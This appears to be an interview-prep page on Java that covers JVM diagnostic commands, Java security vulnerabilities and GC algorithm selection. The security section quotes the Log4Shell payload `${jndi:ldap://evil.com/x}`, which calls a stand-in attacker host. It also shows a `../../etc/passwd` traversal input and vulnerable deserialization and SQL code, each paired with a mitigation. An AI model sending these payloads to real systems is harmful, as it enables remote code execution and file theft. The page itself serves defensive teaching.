---
layout: default
title: "Java - Diagnostics and Security"
parent: "Java"
grand_parent: "Interview Mastery"
nav_order: 9
permalink: /interview/java/diagnostics-and-security/
topic: Java
subtopic: Diagnostics and Security
keywords:
  - JVM Profiling and Diagnostic Tools
  - Java Security Vulnerabilities
  - GC Algorithm Selection Framework
difficulty_range: mixed
status: complete
version: 1
---

# JVM Profiling and Diagnostic Tools

**TL;DR** - JVM diagnostic tools (`jcmd`, `jfr`, `jmap`, `jstack`, `jstat`) let you diagnose memory leaks, CPU hotspots, thread issues, and GC problems in running production JVMs without restarting.

---

### The Problem This Solves

Your production application is slow. Is it CPU-bound? Memory-bound? GC thrashing? Thread contention? A blocked database connection? Without diagnostic tools, you're guessing. With them, you see exactly what the JVM is doing.

---

### Tool Map

```
PROBLEM           TOOL            WHAT IT SHOWS
---------         ----            -------------
Memory leak       jmap            Heap dump (snapshot)
                  jcmd            Heap histogram
                  VisualVM        Visual heap analysis

CPU hotspot       JFR             Method profiling
                  async-profiler  CPU flame graph

Thread issue      jstack          Thread dump
                  jcmd            Thread print

GC problem        jstat           GC statistics live
                  GC logs         Pause times, frequency
                  JFR             GC events timeline

Class loading     jcmd            Loaded classes
                  -verbose:class  Class load/unload events
```

---

### Essential Commands

```bash
# 1. FIND THE JVM PID
jcmd -l
# or
jps -lv

# 2. THREAD DUMP (deadlock, contention)
jcmd <pid> Thread.print > threads.txt
# or
jstack <pid> > threads.txt

# 3. HEAP DUMP (memory leak)
jcmd <pid> GC.heap_dump /tmp/heap.hprof
# or
jmap -dump:live,format=b,file=heap.hprof <pid>

# 4. HEAP HISTOGRAM (quick memory check)
jcmd <pid> GC.class_histogram | head -20
# Shows top classes by instance count/bytes

# 5. GC STATISTICS (live monitoring)
jstat -gcutil <pid> 1000
# Output every 1 second:
# S0   S1   E    O    M    CCS  YGC  YGCT  FGC  FGCT
# 0.00 45.2 67.1 34.5 97.8 95.1 142  1.23  3    0.45

# 6. JVM FLAGS (check current settings)
jcmd <pid> VM.flags

# 7. JAVA FLIGHT RECORDER (comprehensive)
jcmd <pid> JFR.start duration=60s \
  filename=/tmp/recording.jfr
# Low-overhead (<2%) production profiling
```

---

### Diagnostic Workflows

**Memory Leak Diagnosis:**

```
1. jstat -gcutil <pid> 1000
   -> Watch Old gen (O column) trending up
   -> Full GC (FGC) count increasing
   -> But O% never drops after Full GC = LEAK

2. jcmd <pid> GC.heap_dump /tmp/heap.hprof

3. Open in Eclipse MAT or VisualVM
   -> Leak Suspects report
   -> Dominator tree (who holds the most memory)
   -> Find the collection/cache growing unbounded
```

**CPU Hotspot Diagnosis:**

```
1. JFR recording for 60 seconds
   jcmd <pid> JFR.start duration=60s \
     filename=/tmp/cpu.jfr

2. Open in JDK Mission Control
   -> Method Profiling tab
   -> See which methods consume most CPU
   -> Or: convert to flame graph with
      async-profiler
```

---

### JFR (Java Flight Recorder) - Deep Dive

```java
// Enable JFR from application startup
// JVM flags:
// -XX:StartFlightRecording=
//   duration=0,
//   maxsize=500m,
//   disk=true,
//   filename=/var/log/app/flight.jfr

// Or start/stop dynamically:
// jcmd <pid> JFR.start name=diag
// jcmd <pid> JFR.stop name=diag
//   filename=/tmp/diag.jfr

// JFR events collected (low overhead < 2%):
// - Method profiling (CPU hotspots)
// - Allocations (memory pressure)
// - GC pauses (timing, cause)
// - Thread states (contention)
// - I/O (file, socket)
// - Exceptions (even caught ones)
// - Class loading
// - Lock contention
```

---

### Quick Recall

**If you remember only 3 things:**

1. `jcmd` is the Swiss Army knife - thread dumps, heap dumps, GC stats, JFR, flags
2. JFR is the production-safe profiler (< 2% overhead) - always have it running
3. Memory leak workflow: `jstat` (trending) -> `jcmd GC.heap_dump` -> Eclipse MAT (analysis)

**Interview one-liner:**
"For production JVM diagnostics, I use jcmd as my primary tool - thread dumps for contention, heap dumps analyzed in Eclipse MAT for memory leaks, and JFR recordings for CPU profiling with under 2% overhead."

---

### Interview Deep-Dive

**Q1: Your Java application is consuming 8GB of heap and keeps growing. How do you find the memory leak?**

_Why they ask:_ The most common production Java question.

**Answer:**

1. **Confirm it's a leak, not just high usage.** Run `jstat -gcutil <pid> 1000` and watch the Old generation (O column). If it trends upward and Full GC doesn't reclaim it, it's a leak.

2. **Take a heap dump.** `jcmd <pid> GC.heap_dump /tmp/heap.hprof`. Take two dumps 10 minutes apart for comparison.

3. **Analyze in Eclipse MAT.** Open the dump, run "Leak Suspects" report. Check the "Dominator Tree" - the objects retaining the most memory. Typically it's a `HashMap`, `ArrayList`, or cache that grows without eviction.

4. **Trace the GC root path.** In MAT, right-click the suspect -> "Path to GC Roots" -> "exclude weak/soft references." This shows why the object can't be collected - usually a static field, a ThreadLocal not cleaned up, or a listener not deregistered.

5. **Common leak sources:** (a) Static collections that only grow, never shrink. (b) ThreadLocal not removed after use (especially in thread pools). (c) Unclosed streams, connections, or ResultSets. (d) Event listeners not deregistered. (e) Classloader leaks in web applications.

**Q2: How do you differentiate between a CPU-bound and I/O-bound performance problem?**

_Why they ask:_ Tests systematic diagnosis approach.

**Answer:**

1. **Check CPU utilization.** `top -H -p <pid>` shows per-thread CPU. If CPU is near 100% per core, it's CPU-bound. If CPU is low but latency is high, it's I/O-bound.

2. **Thread dump analysis.** CPU-bound: threads are RUNNABLE, actively executing compute-heavy code. I/O-bound: threads are BLOCKED/WAITING/TIMED_WAITING, stuck on socket reads, database queries, or file I/O.

3. **JFR recording.** Method profiling shows CPU hotspots. I/O tab shows time spent in file/network I/O. Thread sleep/wait time vs compute time ratio reveals the bottleneck.

4. **Fix:** CPU-bound -> optimize algorithm, cache results, parallelize. I/O-bound -> async I/O, connection pooling, batching, caching.

---

---

# Java Security Vulnerabilities

**TL;DR** - Java applications are vulnerable to deserialization attacks, injection flaws, and dependency vulnerabilities (like Log4Shell) - understanding these attack vectors is essential for building secure software.

---

### Log4Shell (CVE-2021-44228) - The Landmark Vulnerability

**What happened:**
Log4j 2.x had a feature: JNDI lookup in log messages. If a user-controlled string was logged, an attacker could inject `${jndi:ldap://evil.com/exploit}` into any logged field (headers, form inputs, user agents). Log4j would resolve the JNDI lookup, connect to the attacker's LDAP server, download a malicious class, and execute it. Remote Code Execution (RCE) with a single log statement.

```java
// VULNERABLE: Any logged user input
log.info("User-Agent: {}", request.getHeader("User-Agent"));
// Attacker sends: User-Agent: ${jndi:ldap://evil.com/x}
// Log4j resolves JNDI -> connects to evil.com -> RCE

// IMPACT: Affected virtually every Java application
// using Log4j 2.0-2.14.1 (billions of devices)
```

**Lessons:**

1. Never allow string interpolation in log messages with untrusted data
2. Dependency scanning (Dependabot, Snyk, OWASP Dependency-Check) catches known CVEs
3. SBOM (Software Bill of Materials) lets you quickly identify affected systems
4. WAF rules and egress filtering limit blast radius

---

### Java Deserialization Attacks

```java
// BAD: Deserializing untrusted data
ObjectInputStream ois =
    new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject(); // DANGEROUS
// Attacker sends crafted byte stream that triggers
// arbitrary code execution via gadget chains

// GOOD: Never deserialize untrusted input
// Use JSON (Jackson/Gson) instead of Java serialization
ObjectMapper mapper = new ObjectMapper();
UserRequest req = mapper.readValue(
    request.getInputStream(), UserRequest.class);

// If you MUST use Java serialization:
// 1. Use ObjectInputFilter (Java 9+)
ObjectInputFilter filter =
    ObjectInputFilter.Config.createFilter(
        "com.myapp.*;!*");
ois.setObjectInputFilter(filter);

// 2. Never expose deserialization endpoints publicly
// 3. Use look-ahead deserialization (Apache Commons)
```

---

### Common Java Security Issues

| Vulnerability             | Attack Vector                    | Prevention                      |
| ------------------------- | -------------------------------- | ------------------------------- |
| SQL Injection             | String concat in queries         | Parameterized queries, JPA      |
| Deserialization RCE       | Untrusted ObjectInputStream      | JSON instead, ObjectInputFilter |
| Log Injection             | User input in log messages       | Sanitize, upgrade Log4j         |
| XXE (XML External Entity) | XML parsing with DTD             | Disable DTD, use JSON           |
| Path Traversal            | `../../etc/passwd` in file paths | Validate, canonicalize paths    |
| Dependency CVEs           | Transitive vulnerable deps       | Dependabot, OWASP DC            |

---

### Secure Coding Checklist

```java
// 1. PARAMETERIZED QUERIES (prevent SQL injection)
// BAD:
String sql = "SELECT * FROM users WHERE name = '"
    + name + "'";
// GOOD:
@Query("SELECT u FROM User u WHERE u.name = :name")
User findByName(@Param("name") String name);

// 2. INPUT VALIDATION (prevent injection)
// Always validate at the boundary
@NotBlank @Size(max = 100)
@Pattern(regexp = "^[a-zA-Z0-9_]+$")
private String username;

// 3. SECRETS MANAGEMENT
// BAD: hardcoded in application.properties
spring.datasource.password=mysecret
// GOOD: environment variable or vault
spring.datasource.password=${DB_PASSWORD}

// 4. DEPENDENCY SCANNING
// pom.xml: add OWASP dependency-check plugin
// CI: run `mvn dependency-check:check`
// GitHub: enable Dependabot alerts
```

---

### Quick Recall

**If you remember only 3 things:**

1. Log4Shell: JNDI lookup in log messages = RCE. Upgrade Log4j, scan dependencies, filter egress
2. Never deserialize untrusted Java objects - use JSON with Jackson instead
3. Parameterized queries, input validation, dependency scanning are the three pillars of Java security

**Interview one-liner:**
"I protect Java applications through parameterized queries for injection prevention, JSON over Java serialization for safe data exchange, dependency scanning with OWASP Dependency-Check for transitive CVEs like Log4Shell, and input validation at every system boundary."

---

### Interview Deep-Dive

**Q1: You discover one of your production services is vulnerable to Log4Shell. Walk through your response.**

_Why they ask:_ Tests incident response and practical security thinking.

**Answer:**

1. **Immediate mitigation (minutes):** Set `log4j2.formatMsgNoLookups=true` JVM flag or environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`. This disables message lookups without code changes.

2. **WAF/egress rules (hours):** Block outbound LDAP/RMI/DNS to unknown hosts. Add WAF rules to detect `${jndi:` patterns in headers and request bodies.

3. **Identify blast radius (hours):** Use SBOM or `mvn dependency:tree | grep log4j` across all services to find affected applications. Transitive dependencies often pull in Log4j without your knowledge.

4. **Patch (days):** Upgrade Log4j to 2.17.1+. Rebuild and deploy all affected services. For services that can't be immediately patched, remove the JndiLookup class from the classpath.

5. **Post-mortem:** Run forensics to check if the vulnerability was exploited (search logs for `${jndi:` patterns). Check for unexpected outbound connections. Review and strengthen dependency scanning in CI/CD.

**Q2: How do you prevent deserialization attacks in a Java application?**

_Why they ask:_ Tests understanding of a critical Java-specific vulnerability.

**Answer:**
The best defense is to never use Java's native serialization for external input. Use JSON (Jackson) or Protocol Buffers instead.

If Java serialization is unavoidable: (1) Use `ObjectInputFilter` (Java 9+) to whitelist allowed classes. (2) Never accept serialized objects from untrusted sources (public APIs). (3) Remove known gadget chain libraries (Apache Commons Collections < 3.2.2) or upgrade them. (4) Use serialization proxies (Effective Java Item 90) for classes that must be serializable. (5) Consider using SerialKiller or notsoserial libraries that add deserialization firewalls.

---

---

# GC Algorithm Selection Framework

**TL;DR** - Choose your GC algorithm based on the application's latency requirements, throughput needs, and heap size - G1 is the default, ZGC for ultra-low latency, Parallel GC for batch throughput.

---

### Decision Matrix

```
WHAT MATTERS MOST?
  |
  |-- Low latency (< 10ms pauses)?
  |     |-- Heap < 16GB? -> G1GC
  |     |-- Heap 16GB+? -> ZGC
  |     |-- Extreme (< 1ms)? -> ZGC
  |
  |-- Max throughput (batch processing)?
  |     -> Parallel GC
  |
  |-- Small heap (< 512MB)?
  |     -> Serial GC
  |
  |-- Don't know / general purpose?
        -> G1GC (default since Java 9)
```

---

### Comparison

| GC         | Max Pause | Throughput | Heap Range | Best For             |
| ---------- | --------- | ---------- | ---------- | -------------------- |
| Serial     | 100ms+    | Low        | < 512MB    | Dev, small apps      |
| Parallel   | 100ms+    | Highest    | Any        | Batch jobs, big data |
| G1         | 10-200ms  | Good       | 4-64GB     | General purpose      |
| ZGC        | < 1ms     | Good       | 8GB-16TB   | Low-latency services |
| Shenandoah | < 10ms    | Good       | 4GB-1TB    | Low-latency (RedHat) |

---

### When to Tune vs When to Switch

```
STEP 1: Start with G1GC (default)
  Measure: p99 latency, throughput, heap usage

STEP 2: If latency too high
  -> Try ZGC: -XX:+UseZGC
  -> ZGC has < 1ms pauses regardless of heap size

STEP 3: If throughput too low (batch jobs)
  -> Try Parallel: -XX:+UseParallelGC
  -> Accepts longer pauses for higher throughput

STEP 4: Only tune AFTER choosing the right GC
  -> G1: -XX:MaxGCPauseMillis=200
  -> Heap: -Xms and -Xmx same value (avoid resize)
  -> New gen: usually don't touch (GC auto-sizes)
```

---

### Code Example (JVM Flags)

```bash
# G1GC (default, general purpose)
java -Xms4g -Xmx4g \
  -XX:+UseG1GC \
  -XX:MaxGCPauseMillis=200 \
  -Xlog:gc*:file=gc.log:time \
  -jar app.jar

# ZGC (ultra-low latency)
java -Xms8g -Xmx8g \
  -XX:+UseZGC \
  -Xlog:gc*:file=gc.log:time \
  -jar app.jar

# Parallel GC (max throughput, batch jobs)
java -Xms16g -Xmx16g \
  -XX:+UseParallelGC \
  -XX:ParallelGCThreads=8 \
  -jar app.jar
```

---

### Quick Recall

**If you remember only 3 things:**

1. G1GC is the default and correct for 90% of applications - start here
2. ZGC for sub-millisecond pauses on any heap size (8GB-16TB)
3. Only tune AFTER picking the right algorithm - most tuning is unnecessary with modern GCs

**Interview one-liner:**
"I start with G1GC as the default, measure p99 latency and throughput, then switch to ZGC if I need sub-millisecond pauses for latency-sensitive services, or Parallel GC if I need maximum throughput for batch processing - I set -Xms equal to -Xmx and let the GC auto-tune before manual intervention."
